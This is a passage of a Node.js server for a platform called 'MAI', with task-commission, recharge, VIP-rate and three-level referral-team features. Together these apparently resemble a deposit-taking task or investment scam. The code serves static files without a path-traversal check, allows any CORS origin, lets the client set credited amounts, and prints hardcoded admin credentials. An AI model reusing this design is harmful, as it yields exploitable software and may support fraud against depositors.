          'Status: Pending approval'
        );
      }
      ok(res, { transaction: tx });
    });
  }

  if (pathname === '/api/user/transactions' && method === 'GET') {
    var u = requireAuth(req, res); if (!u) return;
    var db = readDB();
    var user = db.users.find(function(x){ return x.id === u.id; });
    return ok(res, { transactions: user ? (user.transactions||[]) : [] });
  }

  if (pathname === '/api/user/task' && method === 'POST') {
    var u = requireAuth(req, res); if (!u) return;
    return parseBody(req, function(body){
      var db = readDB();
      var idx = db.users.findIndex(function(x){ return x.id === u.id; });
      if (idx === -1) return err(res,'User not found',404);
      var amount = parseFloat(body.amount)||0;
      var taskAmount = parseFloat(body.taskAmount)||0;
      if (amount <= 0) return err(res,'Invalid amount');
      // Check balance
      if ((db.users[idx].balance||0) < taskAmount) return err(res,'Insufficient balance for this task');
      var tx = { id:genTxId(), type:'task', amount:amount,
        taskAmount:taskAmount, status:'completed', date:new Date().toISOString(),
        description:body.description||'Task Commission', network:'', txHash:'' };
      if (!db.users[idx].transactions) db.users[idx].transactions=[];
      db.users[idx].transactions.unshift(tx);
      applyTx(db.users[idx], tx);
      writeDB(db);
      ok(res, { transaction: tx, balance: db.users[idx].balance });
    });
  }

  if (pathname === '/api/user/team' && method === 'GET') {
    var u = requireAuth(req, res); if (!u) return;
    var db = readDB();
    var user = db.users.find(function(x){ return x.id === u.id; });
    if (!user) return err(res,'User not found',404);
    var l1 = (user.teamL1||[]).map(function(id){ return db.users.find(function(x){ return x.id===id; }); }).filter(Boolean).map(sanitizeUser);
    var l2 = [], l3 = [];
    l1.forEach(function(m){
      var full = db.users.find(function(x){ return x.id===m.id; });
      if (!full) return;
      (full.teamL1||[]).forEach(function(id2){
        var u2 = db.users.find(function(x){ return x.id===id2; });
        if (!u2) return;
        l2.push(sanitizeUser(u2));
        (u2.teamL1||[]).forEach(function(id3){
          var u3 = db.users.find(function(x){ return x.id===id3; });
          if (u3) l3.push(sanitizeUser(u3));
        });
      });
    });
    return ok(res, { team:{ l1:l1, l2:l2, l3:l3 } });
  }

  return err(res,'Not found',404);
}

// ── SANITIZE USER (remove password) ──────────────────────────
function sanitizeUser(u) {
  var copy = Object.assign({},u);
  delete copy.password;
  return copy;
}

// ── STATIC FILE SERVER ────────────────────────────────────────
function serveStatic(req, res, filePath) {
  var fullPath = path.join(__dirname, filePath);
  var ext = path.extname(fullPath).toLowerCase();
  var contentType = MIME[ext] || 'application/octet-stream';
  fs.readFile(fullPath, function(err2, data){
    if (err2) {
      res.writeHead(404, {'Content-Type':'text/plain'});
      res.end('404 Not Found: ' + filePath);
      return;
    }
    res.writeHead(200, {'Content-Type':contentType});
    res.end(data);
  });
}

// ── MAIN SERVER ───────────────────────────────────────────────
seedDB();

// ── MIGRATE VIP RATES (fix old volumes with wrong rates) ──────
(function migrateVipRates() {
  var db = readDB();
  var s = db.settings || {};
  var changed = false;
  if (s.vip1Rate !== 20) { s.vip1Rate = 20; changed = true; }
  if (s.vip2Rate !== 35) { s.vip2Rate = 35; changed = true; }
  if (s.vip3Rate !== 55) { s.vip3Rate = 55; changed = true; }
  if (changed) { db.settings = s; writeDB(db); console.log('VIP rates forced to 20/35/55'); }
})();

// ── MIGRATE PLATFORM INTRO IMAGES (fix old SVG to real photos) ─
(function migratePlatformIntro() {
  var db = readDB();
  var c = db.content || {};
  var intro = c.platformIntro || [];
  var needsFix = intro.some(function(i){ return i.image && i.image.indexOf('.svg') !== -1; });
  if (needsFix || !intro.length) {
    c.platformIntro = [
      { title:'Platform Profile', desc:'MAI is an intelligent cloud global order matching center built for modern investors.', image:'https://images.unsplash.com/photo-1611974789855-9c2a0a7236a3?w=400&h=220&fit=crop', gradient:'135deg,#667eea,#764ba2' },
      { title:'Platform Rules', desc:'The platform will update recharge rules to protect all users and ensure fairness.', image:'https://images.unsplash.com/photo-1450101499163-c8848c66ca85?w=400&h=220&fit=crop', gradient:'135deg,#f093fb,#f5576c' },
      { title:'Win-Win Cooperation', desc:'AI-MAI carries out win-win cooperation for all users across the globe.', image:'https://images.unsplash.com/photo-1521737604893-d14cc237f11d?w=400&h=220&fit=crop', gradient:'135deg,#4facfe,#00f2fe' },
      { title:'Instructions for Use', desc:'To celebrate MAI membership milestones, special rewards await all members.', image:'https://images.unsplash.com/photo-1553729459-efe14ef6055d?w=400&h=220&fit=crop', gradient:'135deg,#43e97b,#38f9d7' }
    ];
    db.content = c;
    writeDB(db);
    console.log('Platform intro images migrated to real photos');
  }
})();

const server = http.createServer(function(req, res) {
  var parsed = url.parse(req.url, true);
  var pathname = parsed.pathname;

  // CORS preflight
  if (req.method === 'OPTIONS') {
    res.writeHead(204, {
      'Access-Control-Allow-Origin':'*',
      'Access-Control-Allow-Methods':'GET,POST,PUT,DELETE,OPTIONS',
      'Access-Control-Allow-Headers':'Content-Type,Authorization'
    });
    return res.end();
  }

  // API routes
  if (pathname.startsWith('/api/')) {
    res.setHeader('Access-Control-Allow-Origin','*');
    return handleAPI(req, res, pathname);
  }

  // Static files
  var filePath = pathname === '/' ? '/login.html' : pathname;
  filePath = filePath.split('?')[0];
  serveStatic(req, res, filePath);
});

server.on('error', function(e) {
  if (e.code === 'EADDRINUSE') {
    console.error('\n❌ Port ' + PORT + ' is already in use.');
    console.error('Run: taskkill /F /IM node.exe  then try again.\n');
    process.exit(1);
  } else {
    throw e;
  }
});

server.listen(PORT, '0.0.0.0', function(){
  console.log('\n=================================');
  console.log('  MAI Server running on port ' + PORT);
  console.log('=================================');
  console.log('Website : http://localhost:' + PORT);
  console.log('Admin   : http://localhost:' + PORT + '/admin/pages/dashboard.html');
  console.log('Login   : http://localhost:' + PORT + '/login.html');
  console.log('---------------------------------');
  console.log('Admin   : admin@mai.com / admin123');
  console.log('Demo    : demo@mai.com  / demo123');
  console.log('=================================\n');
});
